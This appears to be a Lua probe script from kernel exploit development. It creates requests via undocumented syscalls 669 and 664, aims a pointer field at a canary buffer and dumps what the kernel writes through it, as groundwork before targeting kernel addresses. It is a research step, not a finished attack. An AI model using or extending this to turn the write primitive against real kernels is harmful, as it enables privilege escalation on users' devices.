-- CRASH_CLASS: HIGH
-- PROBE 492c: what poll writes through request+0x18
-- 492b mapped the request fields: only the qword at +0x18 is dereferenced, and
-- the page it points at is modified. This dumps the result so the value and the
-- size of the write are known before any kernel address is ever tried.
print("=== PROBE 492c: poll write through +0x18 ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local canary = memory.alloc(0x2000)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local function fill(buf, n, v)
  for off = 0, n - 1, 4 do pcall(function() memory.write_dword(buf + off, v) end) end
end
local function dump8(buf, n)
  local o = {}
  for off = 0, n - 1, 8 do
    local lo = to_num(memory.read_dword(buf + off))
    local hi = to_num(memory.read_dword(buf + off + 4))
    o[#o + 1] = string.format("%08x%08x", hi, lo)
  end
  return table.concat(o, " ")
end
local function run(label, field, mode, count)
  fill(data, 0x2000, 0)
  fill(canary, 0x2000, 0xA5A5A5A5)
  for i = 0, count - 1 do
    pcall(function() memory.write_qword(data + i * 0x28 + 0x18, uint64(canary)) end)
  end
  pcall(function() memory.write_qword(data + field, uint64(canary)) end)
  fill(out, 0x100, 0)
  local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(count), uint64(mode), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if not ok or id <= 0 then print(label .. " create failed"); return end
  pcall(function() memory.write_dword(ids, id) end)
  fill(res, 0x400, 0x77777777)
  local pok, prv = pcall(function() return sc664(uint64(ids), uint64(count), uint64(res)) end)
  print(string.format("%s mode=%d count=%d id=%d poll_ret=%s res=%s", label, mode, count, id,
        pok and tostring(to_num(prv)) or "-", dump8(res, 0x20)))
  print("    canary[0x00..0x40] = " .. dump8(canary, 0x40))
end
run("A", 0x18, 1, 1)
run("B", 0x18, 2, 1)
run("C", 0x18, 1, 4)
print("=== PROBE 492c COMPLETE ===")
